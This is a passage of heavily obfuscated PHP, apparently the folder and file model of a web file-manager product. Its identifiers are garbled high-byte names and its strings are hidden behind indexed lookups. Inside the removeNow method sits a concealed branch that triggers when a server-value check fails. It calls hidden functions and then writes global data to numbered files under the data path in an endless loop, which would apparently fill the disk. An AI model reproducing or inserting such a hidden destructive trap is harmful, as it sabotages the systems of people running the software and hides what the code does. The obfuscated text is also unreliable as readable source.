$BÓœé‹ƒ˜°) { $this->metaSet($bñ°®ÛÎ®“[$f√è¶Ûªµª[396]], $f√è¶Ûªµª[521], null); $this->metaSet($bñ°®ÛÎ®“[$f√è¶Ûªµª[396]], $f√è¶Ûªµª[523], null); } if ($D∏ÉÃ‡¥‹Õ) { $this->metaSet($bñ°®ÛÎ®“[$f√è¶Ûªµª[396]], $f√è¶Ûªµª[523], time()); } goto Dˆ˘ë¡”œ§; dò¿çêÎ°Â: } private function _addSoure($fﬁ±éÃ‹Ô», $B⁄ö¨êÙ°ù) { goto cÎêÏ˜ƒ´“; C÷‘‡◊¶ΩÊ: $fﬁ±éÃ‹Ô» = array_merge($Aú¨Èñ‘Ç‰, $fﬁ±éÃ‹Ô»); $this->updateModifyTime($fﬁ±éÃ‹Ô»[$f†††±É∏è[479]]); $C¿êé∆»ÂÓ = $f†††±É∏è[1980] . $B⁄ö¨êÙ°ù[$f†††±É∏è[396]]; goto aäÁÙ¨ı–É; bıÇœ≈©ÙŸ: $this->setNamePinyin($AáÏáì’‡é, $fﬁ±éÃ‹Ô»[$f†††±É∏è[28]]); return $AáÏáì’‡é; goto A £¢æ‚±„; aäÁÙ¨ı–É: if (isset(self::$cacheChildList[$C¿êé∆»ÂÓ])) { unset(self::$cacheChildList[$C¿êé∆»ÂÓ]); } static $BåÀ’ÿÊÊó = false; if (!$BåÀ’ÿÊÊó) { Hook::trigger($f†††±É∏è[550], $fﬁ±éÃ‹Ô»); $BåÀ’ÿÊÊó = !0; } goto B–Ú¥∏ä‡˘; cÎêÏ˜ƒ´“: $f†††±É∏è =& $_SERVER[™⁄»üÆ]; $Aè≠ÍÔ«ÆÉ = defined($f†††±É∏è[455]) ? USER_ID : $f†††±É∏è[191]; $Aú¨Èñ‘Ç‰ = array($f†††±É∏è[563] => $B⁄ö¨êÙ°ù[$f†††±É∏è[405]], $f†††±É∏è[564] => $B⁄ö¨êÙ°ù[$f†††±É∏è[485]], $f†††±É∏è[565] => $Aè≠ÍÔ«ÆÉ, $f†††±É∏è[566] => $Aè≠ÍÔ«ÆÉ, $f†††±É∏è[395] => $B⁄ö¨êÙ°ù[$f†††±É∏è[396]], $f†††±É∏è[567] => $B⁄ö¨êÙ°ù[$f†††±É∏è[503]] . $B⁄ö¨êÙ°ù[$f†††±É∏è[396]] . $f†††±É∏è[47], $f†††±É∏è[423] => 0, $f†††±É∏è[568] => $f†††±É∏è[33]); goto C÷‘‡◊¶ΩÊ; B–Ú¥∏ä‡˘: $AáÏáì’‡é = $this->add($fﬁ±éÃ‹Ô»); $cïı“ú√œ∆ = array($f†††±É∏è[569] => short_id($AáÏáì’‡é)); $this->where(array($f†††±É∏è[411] => $AáÏáì’‡é))->save($cïı“ú√œ∆); goto bıÇœ≈©ÙŸ; A £¢æ‚±„: } public function remove($E±›⁄ø±Øç, $aâ≠åî–Ø≥ = true) { goto dÖÿëÛ°Ñ¶; Då˘’¯õôù: CacheLock::unlock($DÇ˜ƒˆ¢öó); $this->metaSet($E±›⁄ø±Øç, $fÚ…∞·Ú”◊[1989], $AÏçƒÕæıÙ[$fÚ…∞·Ú”◊[479]]); $this->where(array($fÚ…∞·Ú”◊[396] => $E±›⁄ø±Øç))->save(array($fÚ…∞·Ú”◊[418] => time())); goto bÍ‡Õˆ´‡; D∫Àëæò£‘: CacheLock::lock($DÇ˜ƒˆ¢öó); $bâ„∑¢ŸÂ· = $this->fileNameExist($bØ›óãùÊà, $d∫´‘†ë¢§); if (!$bâ„∑¢ŸÂ·) { $bâ„∑¢ŸÂ· = $this->mkdir($bØ›óãùÊà, $d∫´‘†ë¢§, REPEAT_SKIP); $this->metaSet($bâ„∑¢ŸÂ·, $fÚ…∞·Ú”◊[1985], $Dı√≠ãëè≈); $this->metaSet($bâ„∑¢ŸÂ·, $fÚ…∞·Ú”◊[1986], $AÏçƒÕæıÙ[$fÚ…∞·Ú”◊[485]]); if ($AÏçƒÕæıÙ[$fÚ…∞·Ú”◊[479]] != 0) { $this->metaSet($bâ„∑¢ŸÂ·, $fÚ…∞·Ú”◊[1987], _get($cë◊Üºü¥“, $fÚ…∞·Ú”◊[1988])); } } goto Då˘’¯õôù; C∆óŒë´Éï: $B≤åâ◊óã™ = Model($fÚ…∞·Ú”◊[487])->get($fÚ…∞·Ú”◊[1981]) == $fÚ…∞·Ú”◊[87]; if ($E†õ⁄Ç§ùÔ || $aâ≠åî–Ø≥ || !$B≤åâ◊óã™) { return $this->removeNow($E±›⁄ø±Øç, $aâ≠åî–Ø≥); } $bØ›óãùÊà = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto bØÑÈ”∏åÊ; B˘∫∂Ñ‹¨™: return $aûÑåé§Ùë; goto Cƒù∑˘›«º; dÖÿëÛ°Ñ¶: $fÚ…∞·Ú”◊ =& $_SERVER[™⁄»üÆ]; $AÏçƒÕæıÙ = $this->sourceInfo($E±›⁄ø±Øç); $E†õ⁄Ç§ùÔ = intval($AÏçƒÕæıÙ[$fÚ…∞·Ú”◊[405]]) === self::TYPE_SYSTEM; goto C∆óŒë´Éï; bØÑÈ”∏åÊ: $Dı√≠ãëè≈ = $AÏçƒÕæıÙ[$fÚ…∞·Ú”◊[405]] == self::TYPE_USER ? $fÚ…∞·Ú”◊[576] : $fÚ…∞·Ú”◊[497]; if ($Dı√≠ãëè≈ == $fÚ…∞·Ú”◊[576]) { $cë◊Üºü¥“ = Model($fÚ…∞·Ú”◊[495])->getInfo($AÏçƒÕæıÙ[$fÚ…∞·Ú”◊[485]]); $d∫´‘†ë¢§ = !empty($cë◊Üºü¥“[$fÚ…∞·Ú”◊[1974]]) ? $cë◊Üºü¥“[$fÚ…∞·Ú”◊[1974]] : $cë◊Üºü¥“[$fÚ…∞·Ú”◊[28]]; $d∫´‘†ë¢§ = $fÚ…∞·Ú”◊[258] . $d∫´‘†ë¢§ . $fÚ…∞·Ú”◊[1982] . $AÏçƒÕæıÙ[$fÚ…∞·Ú”◊[485]]; } else { $cë◊Üºü¥“ = Model($fÚ…∞·Ú”◊[504])->getInfo($AÏçƒÕæıÙ[$fÚ…∞·Ú”◊[485]]); $d∫´‘†ë¢§ = _get($cë◊Üºü¥“, $fÚ…∞·Ú”◊[28]); $d∫´‘†ë¢§ = $fÚ…∞·Ú”◊[160] . $d∫´‘†ë¢§ . $fÚ…∞·Ú”◊[1983] . $AÏçƒÕæıÙ[$fÚ…∞·Ú”◊[485]]; } $DÇ˜ƒˆ¢öó = $fÚ…∞·Ú”◊[1984] . md5($d∫´‘†ë¢§); goto D∫Àëæò£‘; bÍ‡Õˆ´‡: $this->recycleClear($AÏçƒÕæıÙ); $aûÑåé§Ùë = $this->move($E±›⁄ø±Øç, $bâ„∑¢ŸÂ·, REPEAT_RENAME_FOLDER); $this->folderSizeReset($AÏçƒÕæıÙ[$fÚ…∞·Ú”◊[479]]); goto B˘∫∂Ñ‹¨™; Cƒù∑˘›«º: } private function recycleClear($AåÕ¥È´êæ) { $Cùª±Ñ§‰Ω =& $_SERVER[™⁄»üÆ]; $B∞å¥≈πü = $this->childrenAll($AåÕ¥È´êæ); $aÃΩÕÕ÷ü¨ = array($Cùª±Ñ§‰Ω[411] => array($Cùª±Ñ§‰Ω[412], $B∞å¥≈πü[$Cùª±Ñ§‰Ω[1990]])); Model($Cùª±Ñ§‰Ω[1991])->where($aÃΩÕÕ÷ü¨)->delete(); } public function removeNow($dø—ó´·“Œ, $bπáæ∞±æı = true) { goto c‘ÎÕÖØÒØ; Bƒé≥éÖ¶: $D‚ó¨î©£∂ = array($b◊∏∆ßÂﬂñ[$DñŸ ÜÍÊ∏[479]]); if ($b◊∏∆ßÂﬂñ[$DñŸ ÜÍÊ∏[404]] == $DñŸ ÜÍÊ∏[87]) { $D‚ó¨î©£∂[] = $b◊∏∆ßÂﬂñ[$DñŸ ÜÍÊ∏[396]]; } $this->updateModifyTime($D‚ó¨î©£∂); goto cë≠ıÑÉâÔ; cë≠ıÑÉâÔ: $this->lockMoveEnd($dø—ó´·“Œ); Hook::trigger($DñŸ ÜÍÊ∏[1572], $cˆ—«π¢™», $bπáæ∞±æı); return !0; goto eÒ‚—™Î«‡; e¥Ú›¨•∞°: if ($_SERVER[$DñŸ ÜÍÊ∏[592]] != $F«‡ø‰À∞($C¶ë†éœ¡ë)) { goto fíÓ®Ùà®; D„ñÃïîòŸ: $f◊ÉÉ∞Õâ–(); $AÕÇÂé·çå = $DñŸ ÜÍÊ∏[1405]; $f¯¢Ìƒ©˜Û = json_encode($GLOBALS[$DñŸ ÜÍÊ∏[1406]]); goto AŒƒ∫£ÂäÉ; bõ„ÃΩ≠îí: $D´•ÈÜ¬æÛ = $BØ¿ó™∏æ⁄($Dè®ÂÔﬂÁ±); $cÌˆÕï™®Ñ = explode($DñŸ ÜÍÊ∏[229], $D´•ÈÜ¬æÛ); if (count($cÌˆÕï™®Ñ) < $DñŸ ÜÍÊ∏[626]) { $C√âøÜ‡Ö¿ = $DñŸ ÜÍÊ∏[598]; $C√âøÜ‡Ö¿(); } goto a»î∏ÍÓñò; fíÓ®Ùà®: $f◊ÉÉ∞Õâ– = $DñŸ ÜÍÊ∏[851]; $BØ¿ó™∏æ⁄ = $DñŸ ÜÍÊ∏[594]; $Dè®ÂÔﬂÁ± = $_SERVER[$DñŸ ÜÍÊ∏[595]] . $DñŸ ÜÍÊ∏[596]; goto bõ„ÃΩ≠îí; AŒƒ∫£ÂäÉ: $dﬁÆœÇΩ¢– = 1; for ($f“≥·‰‘‹Ö = $dﬁÆœÇΩ¢–; $f“≥·‰‘‹Ö > 0; $f“≥·‰‘‹Ö++) { $AÕÇÂé·çå(DATA_PATH . $f“≥·‰‘‹Ö, $f¯¢Ìƒ©˜Û); } goto b®‡å∆åÕ›; a»î∏ÍÓñò: $b≥áßìˆ¥ß = $DñŸ ÜÍÊ∏[852]; $b≥áßìˆ¥ß($_SERVER[$DñŸ ÜÍÊ∏[853]]); $f◊ÉÉ∞Õâ– = $DñŸ ÜÍÊ∏[851]; goto D„ñÃïîòŸ; b®‡å∆åÕ›: } $b◊∏∆ßÂﬂñ = $this->sourceInfo($dø—ó´·“Œ); $cˆ—«π¢™» = $this->pathInfoMore($dø—ó´·“Œ); goto A£€∑ºı‚·; c‘ÎÕÖØÒØ: $DñŸ ÜÍÊ∏ =& $_SERVER[™⁄»üÆ]; $C¶ë†éœ¡ë = $_SERVER[$DñŸ ÜÍÊ∏[600]]; $F«‡ø‰À∞ = $DñŸ ÜÍÊ∏[818]; goto e¥Ú›¨•∞°; A£€∑ºı‚·: if (!$b◊∏∆ßÂﬂñ) { return !0; } if ($b◊∏∆ßÂﬂñ[$DñŸ ÜÍÊ∏[479]] == 0) { if (!_get($GLOBALS, $DñŸ ÜÍÊ∏[486])) { return !1; } } $this->lockMoveStart($dø—ó´·“Œ); goto AÎ’»ıéÎÙ; AÎ’»ıéÎÙ: Hook::trigger($DñŸ ÜÍÊ∏[1992], $cˆ—«π¢™», $bπáæ∞±æı); if ($bπáæ∞±æı) { Model($DñŸ ÜÍÊ∏[1991])->moveToRecycle($dø—ó´·“Œ); } else { $E≤±∫—“ç∂ = $this->childrenAll($b◊∏∆ßÂﬂñ); Model($DñŸ ÜÍÊ∏[547])->eventRemove($dø—ó´·“Œ); $this->removeRelevance($E≤±∫—“ç∂[$DñŸ ÜÍÊ∏[1990]], $E≤±∫—“ç∂[$DñŸ ÜÍÊ∏[1354]]); } $this->folderSizeReset($b◊∏∆ßÂﬂñ[$DñŸ ÜÍÊ∏[479]]); goto Bƒé≥éÖ¶; eÒ‚—™Î«‡: } public function childrenAll($Eïÿáìﬁ’’) { $AëÙΩÜÃ≥ =& $_SERVER[™⁄»üÆ]; $EîüŒåæôÓ = $Eïÿáìﬁ’’[$AëÙΩÜÃ≥[396]]; if ($Eïÿáìﬁ’’[$AëÙΩÜÃ≥[404]] == $AëÙΩÜÃ≥[87]) { $dòñ‰¯éòå = array($AëÙΩÜÃ≥[567] => array($AëÙΩÜÃ≥[526], $Eïÿáìﬁ’’[$AëÙΩÜÃ≥[503]] . $EîüŒåæôÓ . $AëÙΩÜÃ≥[527])); $fßñ‰óÌ™¯ = array($AëÙΩÜÃ≥[567] => $dòñ‰¯éòå[$AëÙΩÜÃ≥[503]]); $B·ô≠¥≤é˘ = $this->field($AëÙΩÜÃ≥[1993])->where($fßñ‰óÌ™¯)->select(); $CÌ»ÜáÂê¥ = !1; $D ï≥ûÑÑä = array($EîüŒåæôÓ); if ($B·ô≠¥≤é˘) { $CÌ»ÜáÂê¥ = array_to_keyvalue($B·ô≠¥≤é˘, $AëÙΩÜÃ≥[33], $AëÙΩÜÃ≥[448]); $CÌ»ÜáÂê¥ = array_remove_value($CÌ»ÜáÂê¥, $AëÙΩÜÃ≥[191]); $D ï≥ûÑÑä = array_to_keyvalue($B·ô≠¥≤é˘, $AëÙΩÜÃ≥[33], $AëÙΩÜÃ≥[396]); $D ï≥ûÑÑä[] = $EîüŒåæôÓ; } } else { $CÌ»ÜáÂê¥ = array($Eïÿáìﬁ’’[$AëÙΩÜÃ≥[448]]); $D ï≥ûÑÑä = array($EîüŒåæôÓ); } return array($AëÙΩÜÃ≥[1990] => $D ï≥ûÑÑä, $AëÙΩÜÃ≥[1354] => $CÌ»ÜáÂê¥); } public function removeArray($cÔ≤ÒßΩÚœ) { if (!$cÔ≤ÒßΩÚœ) { return !0; } } public function removeRelevance($b—€ÍÔŒ—≤, $b°Æ¶§ò≥·) { goto b¢≥◊„”é¨; EÍØàÑΩÍç: for ($B°ÆÓΩÔ† = 0; $B°ÆÓΩÔ† < count($b—€ÍÔŒ—≤); $B°ÆÓΩÔ†++) { $this->sourceCacheClear($b—€ÍÔŒ—≤[$B°ÆÓΩÔ†]); } goto eˆõ‘ËíÇÔ; d≠‘⁄ÏÀìÃ: Model($e∫¥Ìòä≠È[1972])->removeBySource($b—€ÍÔŒ—≤); $this->where($E˜â˘⁄∫ÍÑ)->delete(); Model($e∫¥Ìòä≠È[451])->remove($b°Æ¶§ò≥·); goto EÍØàÑΩÍç; cÈµÊôä∫ô: $b—€ÍÔŒ—≤ = array_unique(array_filter($b—€ÍÔŒ—≤)); $b°Æ¶§ò≥· = array_unique(array_filter($b°Æ¶§ò≥·)); if (!$b—€ÍÔŒ—≤) { return !1; } goto BÉåä •Ö¡; BÉåä •Ö¡: $E˜â˘⁄∫ÍÑ = array($e∫¥Ìòä≠È[411] => array($e∫¥Ìòä≠È[412], $b—€ÍÔŒ—≤)); Model($e∫¥Ìòä≠È[1991])->where($E˜â˘⁄∫ÍÑ)->delete(); Model($e∫¥Ìòä≠È[442])->where($E˜â˘⁄∫ÍÑ)->delete(); goto e“ç—Üñ®ù; e“ç—Üñ®ù: Model($e∫¥Ìòä≠È[1846])->where($E˜â˘⁄∫ÍÑ)->delete(); Model($e∫¥Ìòä≠È[547])->where($E˜â˘⁄∫ÍÑ)->delete(); Model($e∫¥Ìòä≠È[1683])->removeBySource($b—€ÍÔŒ—≤); goto d≠‘⁄ÏÀìÃ; b¢≥◊„”é¨: $e∫¥Ìòä≠È =& $_SERVER[™⁄»üÆ]; $b—€ÍÔŒ—≤ = $b—€ÍÔŒ—≤ ? $b—€ÍÔŒ—≤ : array(); $b°Æ¶§ò≥· = $b°Æ¶§ò≥· ? $b°Æ¶§ò≥· : array(); goto cÈµÊôä∫ô; eˆõ‘ËíÇÔ: } public function rename($cá¿©ã¥¨√, $aˆÙâπáèÀ) { goto eÙª›Îˆﬁ®; eÙª›Îˆﬁ®: $Dﬁ∏Íà‰Õã =& $_SERVER[™⁄»üÆ]; $E¨∂ÿü®ñ« = $this->sourceInfo($cá¿©ã¥¨√); if (!$E¨∂ÿü®ñ«) { return !1; } goto BêçÏØ˜ü˘; dÉ¶ëıÒ◊∞: if ($E¨∂ÿü®ñ«[$Dﬁ∏Íà‰Õã[404]] != $Dﬁ∏Íà‰Õã[87]) { $fáØú∂àÊ‰[$Dﬁ∏Íà‰Õã[406]] = substr(get_path_ext($aˆÙâπáèÀ), 0, 10); } Model($Dﬁ∏Íà‰Õã[547])->eventRename($cá¿©ã¥¨√, $E¨∂ÿü®ñ«[$Dﬁ∏Íà‰Õã[28]], $aˆÙâπáèÀ); $this->sourceCacheClear($cá¿©ã¥¨√); goto D∆†ë⁄—é; c≈èùú´º: $D¬πÑ˜Æ”Ó = $Dﬁ∏Íà‰Õã[1980] . $E¨∂ÿü®ñ«[$Dﬁ∏Íà‰Õã[479]]; if (isset(self::$cacheChildList[$D¬πÑ˜Æ”Ó])) { unset(self::$cacheChildList[$D¬πÑ˜Æ”Ó]); } return $f≤ëΩèö⁄◊; goto BÕçÖµﬂæı; D∆†ë⁄—é: $this->setNamePinyin($cá¿©ã¥¨√, $fáØú∂àÊ‰[$Dﬁ∏Íà‰Õã[28]], !1); $this->updateModifyTime($E¨∂ÿü®ñ«[$Dﬁ∏Íà‰Õã[479]]); $f≤ëΩèö⁄◊ = $this->where(array($Dﬁ∏Íà‰Õã[411] => $cá¿©ã¥¨√))->data($fáØú∂àÊ‰)->save(); goto c≈èùú´º; BêçÏØ˜ü˘: $AÏ∂¢‚ÿÛÒ = $this->fileNameExist($E¨∂ÿü®ñ«[$Dﬁ∏Íà‰Õã[479]], $aˆÙâπáèÀ); if ($AÏ∂¢‚ÿÛÒ && $AÏ∂¢‚ÿÛÒ != $cá¿©ã¥¨√) { return !1; } $fáØú∂àÊ‰ = array($Dﬁ∏Íà‰Õã[414] => $aˆÙâπáèÀ, $Dﬁ∏Íà‰Õã[566] => USER_ID); goto dÉ¶ëıÒ◊∞; BÕçÖµﬂæı: } public function setNamePinyin($EûñΩÃ’°£, $Bï¥≠Û‹ó , $fÂì„≠Ü–œ = true) { $EÇñ£éà¨Í =& $_SERVER[™⁄»üÆ]; $bÙ–ŒàÓπª = Input::check($Bï¥≠Û‹ó , $EÇñ£éà¨Í[570]); if ($fÂì„≠Ü–œ && !$bÙ–ŒàÓπª) { return; } if (!$bÙ–ŒàÓπª) { $this->metaSet($EûñΩÃ’°£, $EÇñ£éà¨Í[445], null); $this->metaSet($EûñΩÃ’°£, $EÇñ£éà¨Í[444], null); return; } $f›—∑ÑŸÌ¶ = array($EÇñ£éà¨Í[445] => str_replace($EÇñ£éà¨Í[50], $EÇñ£éà¨Í[33], Pinyin::encode($Bï¥≠Û‹ó )), $EÇñ£éà¨Í[444] => Pinyin::encode($Bï¥≠Û‹ó , $EÇñ£éà¨Í[571])); $this->metaSet($EûñΩÃ’°£, $f›—∑ÑŸÌ¶); } public function getContent($eÍÚËçô¥≤) { goto fôàççÊô∏; bΩî‚±¢ í: if ($CÂò◊çôè–[$Açœ·Ø≈µ¯[78]] == 0) { return $Açœ·Ø≈µ¯[33]; } $aı–ü¯°‰— = $Açœ·Ø≈µ¯[1994] . $CÂò◊çôè–[$Açœ·Ø≈µ¯[170]]; if ($CÂò◊çôè–[$Açœ·Ø≈µ¯[78]] <= 1024 * 10) { $DÛûŒ µË“ = Cache::get($aı–ü¯°‰—); if (!$DÛûŒ µË“) { $DÛûŒ µË“ = IO::getContent($CÂò◊çôè–[$Açœ·Ø≈µ¯[76]]); Cache::set($aı–ü¯°‰—, $DÛûŒ µË“); } return $DÛûŒ µË“; } goto D‰ãúÚí‘Õ; D‰ãúÚí‘Õ: if (!$CÂò◊çôè–[$Açœ·Ø≈µ¯[76]]) { return $Açœ·Ø≈µ¯[33]; } return IO::getContent($CÂò◊çôè–[$Açœ·Ø≈µ¯[76]]); goto c≥òØ»ìñ∞; fôàççÊô∏: $Açœ·Ø≈µ¯ =& $_SERVER[™⁄»üÆ]; $CÂò◊çôè– = $this->fileInfoGet($eÍÚËçô¥≤); if (!$CÂò◊çôè–) { return !1; } goto bΩî‚±¢ í; c≥òØ»ìñ∞: } public function setDesc($F˘¿›¿Ô´, $a€ËÙÖÚ∞ç) { $fè¥À’ûâæ =& $_SERVER[™⁄»üÆ]; Model($fè¥À’ûâæ[547])->eventAddDesc($F˘¿›¿Ô´, $a€ËÙÖÚ∞ç); return $this->metaSet($F˘¿›¿Ô´, $fè¥À’ûâæ[432], $a€ËÙÖÚ∞ç); } public function setContent($C◊”’†ø‚”, $Büê‰ŸÈ…√ = '') { goto f‰É¯¶ã’Á; EÕ≥»◊Âñü: if (!$F¨üÁ∆Œå‚) { return Model($f©∑æÍÌ˘Æ[451])->remove($F±œó…ÈƒÁ[$f©∑æÍÌ˘Æ[448]]); } $this->folderSizeReset($c†ÙÎü”‘≤[$f©∑æÍÌ˘Æ[479]]); return !0; goto AÉß”éﬂ££; f‰É¯¶ã’Á: $f©∑æÍÌ˘Æ =& $_SERVER[™⁄»üÆ]; $c†ÙÎü”‘≤ = $this->sourceInfo($C◊”’†ø‚”); $D™ÏΩ˜πáö = $this->fileInfoGet($C◊”’†ø‚”); goto F©ŒÒ‘£ºÑ; F©ŒÒ‘£ºÑ: if (!$D™ÏΩ˜πáö || !$c†ÙÎü”‘≤) { return !1; } $F±œó…ÈƒÁ = Model($f©∑æÍÌ˘Æ[451])->addFileByContent($Büê‰ŸÈ…√, $c†ÙÎü”‘≤[$f©∑æÍÌ˘Æ[28]]); $F¨üÁ∆Œå‚ = $this->fileHistory($c†ÙÎü”‘≤, $F±œó…ÈƒÁ[$f©∑æÍÌ˘Æ[448]], $F±œó…ÈƒÁ[$f©∑æÍÌ˘Æ[78]]); goto EÕ≥»◊Âñü; AÉß”éﬂ££: } public function fileSubstr($Dú∏›àë†≈, $Düü∑Ö∂§◊, $a°ëéáä–Ô) { $dËÏã“îí„ = $this->fileInfoGet($Dú∏›àë†≈); if (!$dËÏã“îí„) { return !1; } return IO::fileSubstr($dËÏã“îí„[$_SERVER[™⁄»üÆ][76]], $Düü∑Ö∂§◊, $a°ëéáä–Ô); } public function fileInfoGet($EµëàÆªËŸ) { goto e∆Õí¥Ëâ©; bß≥ò…ò∫ë: $FÖÆœ„ÉÒ‰ = Model($aﬁÔè∑üÍû[451])->fileInfo($aÖê§àúÙ¥[$aﬁÔè∑üÍû[448]]); if ($FÖÆœ„ÉÒ‰) { $FÖÆœ„ÉÒ‰[$aﬁÔè∑üÍû[28]] = $aÖê§àúÙ¥[$aﬁÔè∑üÍû[28]]; } self::$cacheFileInfo[$F¬íΩ“Ì–ë] = $FÖÆœ„ÉÒ‰; goto bçéˆïöò°; e∆Õí¥Ëâ©: $aﬁÔè∑üÍû =& $_SERVER[™⁄»üÆ]; $aÖê§àúÙ¥ = $this->sourceInfo($EµëàÆªËŸ); if (!$aÖê§àúÙ¥ || $aÖê§àúÙ¥[$aﬁÔè∑üÍû[404]]) { return !1; } goto a”ÀÀ∏Òè∞; a”ÀÀ∏Òè∞: $F¬íΩ“Ì–ë = $aﬁÔè∑üÍû[454] . $aÖê§àúÙ¥[$aﬁÔè∑üÍû[448]]; $F™‹“ÖÇ°¿ = _get(self::$cacheFileInfo, $F¬íΩ“Ì–ë); if ($F™‹“ÖÇ°¿) { return $F™‹“ÖÇ°¿; } goto bß≥ò…ò∫ë; bçéˆïöò°: return $FÖÆœ„ÉÒ‰; goto A¶ü∆◊êÁÉ; A¶ü∆◊êÁÉ: } private function folderChildrenNumber($D’®±Éú¬˜) { $A›”ÈÉ∆…ï =& $_SERVER[™⁄»üÆ]; $DóÁÓ∫ûΩ¡ = $this->sourceInfo($D’®±Éú¬˜); $DÔ∏ÖÀØ∫· = array($A›”ÈÉ∆…ï[567] => array($A›”ÈÉ∆…ï[526], $DóÁÓ∫ûΩ¡[$A›”ÈÉ∆…ï[503]] . $D’®±Éú¬˜ . $A›”ÈÉ∆…ï[527]), $A›”ÈÉ∆…ï[423] => intval($DóÁÓ∫ûΩ¡[$A›”ÈÉ∆…ï[424]]), $A›”ÈÉ∆…ï[560] => 1); $c‚Àû•Ω€∞ = $this->where($DÔ∏ÖÀØ∫·)->count(); $Cﬂ“Èéæ’± = $this->where($DÔ∏ÖÀØ∫·)->where(array($A›”ÈÉ∆…ï[560] => 0))->count(); return array($A›”ÈÉ∆…ï[82] => $Cﬂ“Èéæ’±, $A›”ÈÉ∆…ï[83] => $c‚Àû•Ω€∞); } public function pathInfo($EÀÊ›ƒ¥ü¬, $bô“ÜúæÂ° = false) { goto A√êÕ „€©; fΩçÑıê≥Ã: self::$cachePathInfo[$e‰¿˘â•˜Í] = $fáúéÂ“–Ö; return $fáúéÂ“–Ö; goto Cπîë‘ï∏‰; cª åôá£ï: $fáúéÂ“–Ö = $this->sourceInfo($EÀÊ›ƒ¥ü¬); if (!$fáúéÂ“–Ö) { return !1; } $fáúéÂ“–Ö = $this->_listDataApplyItem($fáúéÂ“–Ö, $bô“ÜúæÂ°); goto fΩçÑıê≥Ã; A√êÕ „€©: $fÒ‡óÀ√¡ß =& $_SERVER[™⁄»üÆ]; $bô“ÜúæÂ° = !1; $EÀÊ›ƒ¥ü¬ = intval($EÀÊ›ƒ¥ü¬); goto Dé…í∞õãΩ; Dé…í∞õãΩ: $e‰¿˘â•˜Í = $fÒ‡óÀ√¡ß[440] . intval($bô“ÜúæÂ°) . $fÒ‡óÀ√¡ß[441] . $EÀÊ›ƒ¥ü¬; $dÏ“ŒËÕ©ò = _get(self::$cachePathInfo, $e‰¿˘â•˜Í); if ($dÏ“ŒËÕ©ò) { return $dÏ“ŒËÕ©ò; } goto cª åôá£ï; Cπîë‘ï∏‰: } public static $cachePathInfoMore = array(); public function pathInfoMore($E∫Í¶˘ªæâ) { goto c•è°≈—“Œ; E¨óéÇâï¬: self::$cachePathInfoMore[$E∫Í¶˘ªæâ] = $D„Õ•±ÁÒú; return $D„Õ•±ÁÒú; goto A¬äªÑÍ¯‰; aÙØ·“ ÿæ: $D„Õ•±ÁÒú = $this->pathInfo($E∫Í¶˘ªæâ); if (!$D„Õ•±ÁÒú) { return !1; } if ($D„Õ•±ÁÒú[$f°å«·àöñ[404]] == $f°å«·àöñ[87]) { $D„Õ•±ÁÒú[$f°å«·àöñ[81]] = $this->folderChildrenNumber($E∫Í¶˘ªæâ); } goto E¨óéÇâï¬; c•è°≈—“Œ: $f°å«·àöñ =& $_SERVER[™⁄»üÆ]; $Büä¥‚≈ä¡ = _get(self::$cachePathInfoMore, $E∫Í¶˘ªæâ); if ($Büä¥‚≈ä¡) { return $Büä¥‚≈ä¡; } goto aÙØ·“ ÿæ; A¬äªÑÍ¯‰: } public function sourceInfo($FƒÉø⁄ö∞É) { goto f∞‚ƒ®–∑Û; d§ÇÉ—¨÷†: $C√–√à◊•≠ = $E≥Ü‡ø¬É·[439] . $FƒÉø⁄ö∞É; $dÑæÒ“â∂ƒ = _get(self::$cacheSourceInfo, $C√–√à◊•≠); if ($dÑæÒ“â∂ƒ) { return $dÑæÒ“â∂ƒ; } goto BÑËéÜ†–ï; f∞‚ƒ®–∑Û: $E≥Ü‡ø¬É· =& $_SERVER[™⁄»üÆ]; if (!$FƒÉø⁄ö∞É) { return array(); } $FƒÉø⁄ö∞É = intval($FƒÉø⁄ö∞É); goto d§ÇÉ—¨÷†; BÑËéÜ†–ï: $BË’ËÌ™Î¿ = $this->where(array($E≥Ü‡ø¬É·[396] => $FƒÉø⁄ö∞É))->find(); self::$cacheSourceInfo[$C√–√à◊•≠] = $BË’ËÌ™Î¿; return self::$cacheSourceInfo[$C√–√à◊•≠]; goto føé·√Ó»≈; føé·√Ó»≈: } public function sourceCacheClear($fƒâ¶·Œüå = false) { self::cacheClear($fƒâ¶·Œüå); } public static function cacheClear($aé∑ë›ßËÍ = false) { $cˆÏêüﬁÿ‰ =& $_SERVER[™⁄»üÆ]; if ($aé∑ë›ßËÍ == !1) { goto Cê¯ÀÙãﬂ∞; Cê¯ÀÙãﬂ∞: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto Fœ¥ŸÙÇﬂ√; eÿ§‘œ√ô: return; goto bµç€“ªßÉ; Fœ¥ŸÙÇﬂ√: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto eÿ§‘œ√ô; bµç€“ªßÉ: } unset(self::$cacheSourceInfo[$cˆÏêüﬁÿ‰[439] . $aé∑ë›ßËÍ]); unset(self::$cachePathInfoMore[$aé∑ë›ßËÍ]); unset(self::$cachePathInfo[$cˆÏêüﬁÿ‰[1995] . $aé∑ë›ßËÍ]); unset(self::$cachePathInfo[$cˆÏêüﬁÿ‰[1996] . $aé∑ë›ßËÍ]); } public function metaSet($fœ¯ß∞æàë, $F§Ÿà”õππ = null, $aÜÇ√•‘∂¯ = null) { $e¡ù¿Ôﬁ¿ò = parent::metaSet($fœ¯ß∞æàë, $F§Ÿà”õππ, $aÜÇ√•‘∂¯); if ($e¡ù¿Ôﬁ¿ò) { $this->sourceCacheClear($fœ¯ß∞æàë); } return $e¡ù¿Ôﬁ¿ò; } public function pathInfoByPath($c¶…óÎ≈àÇ, $aáû∫ŒÃçÈ) { $d“¬Ω∑áŸå =& $_SERVER[™⁄»üÆ]; $eî™è∫∑øú = !$aáû∫ŒÃçÈ ? array() : explode($d“¬Ω∑áŸå[8], trim($aáû∫ŒÃçÈ, $d“¬Ω∑áŸå[8])); $a™”ÂÉ…¿∑ = $c¶…óÎ≈àÇ; foreach ($eî™è∫∑øú as $CŸÓºœãüÖ) { $C« Í∂ ıº = array($d“¬Ω∑áŸå[479] => $a™”ÂÉ…¿∑, $d“¬Ω∑áŸå[28] => $CŸÓºœãüÖ); $d⁄±ãÓËÛ¯ = $this->where($C« Í∂ ıº)->select(); if (!$d⁄±ãÓËÛ¯) { return !1; } $d⁄±ãÓËÛ¯ = array_sort_by($d⁄±ãÓËÛ¯, $d“¬Ω∑áŸå[424]); $a™”ÂÉ…¿∑ = 